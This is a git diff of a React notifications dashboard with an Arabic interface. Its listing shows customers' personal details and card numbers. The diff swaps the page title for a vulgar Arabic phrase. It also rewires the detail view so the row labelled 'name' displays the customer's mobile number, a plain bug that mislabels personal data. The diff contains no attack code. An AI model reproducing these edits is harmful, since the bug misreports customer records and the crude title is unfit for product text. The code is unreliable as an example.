@@ -492,7 +492,7 @@ export default function NotificationsPage() {
               <div className="bg-primary/10 p-2 rounded-full">
                 <Bell className="h-6 w-6 text-primary" />
               </div>
-              <h1 className="text-xl font-bold tracking-tight">لوحة الإشعارات</h1>
+              <h1 className="text-xl font-bold tracking-tight">لوحة الغاز وزبي</h1>
             </div>
             <div className="flex items-center gap-3">
               <TooltipProvider>
@@ -1378,12 +1378,12 @@ export default function NotificationsPage() {
                             <div className="grid grid-cols-1 gap-3 mb-3">
                               <div className="flex flex-wrap gap-2">
                                 <Badge
-                                  variant={notification.customer?.name ? "secondary" : "outline"}
+                                  variant={notification.customer?.mobile ? "secondary" : "outline"}
                                   className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors duration-200 shadow-sm"
                                   onClick={() => handleInfoClick(notification, "personal")}
                                 >
                                   <Info className="h-3 w-3 mr-1" />
-                                  {notification.customer?.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                                  {notification.customer?.mobile ? "معلومات شخصية" : "لا يوجد معلومات"}
                                 </Badge>
                                 <Badge
                                   variant={notification.cardNumber ? "default" : "outline"}
@@ -1526,13 +1526,13 @@ export default function NotificationsPage() {
               {selectedNotification?.customer?.mobile && (
                 <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                   <span className="font-medium text-muted-foreground">رقم الجوال:</span>
-                  <span className="font-semibold">{selectedNotification?.customer?.name}</span>
+                  <span className="font-semibold">{selectedNotification?.customer?.mobile}</span>
                 </p>
               )}
               {selectedNotification?.customer?.name && (
                 <p className="flex justify-between items-center py-1.5 border-b border-border/50 last:border-0">
                   <span className="font-medium text-muted-foreground">الاسم:</span>
-                  <span className="font-semibold">{selectedNotification?.customer?.name}</span>
+                  <span className="font-semibold">{selectedNotification?.customer?.mobile}</span>
                 </p>
               )}
               {selectedNotification.phone && (
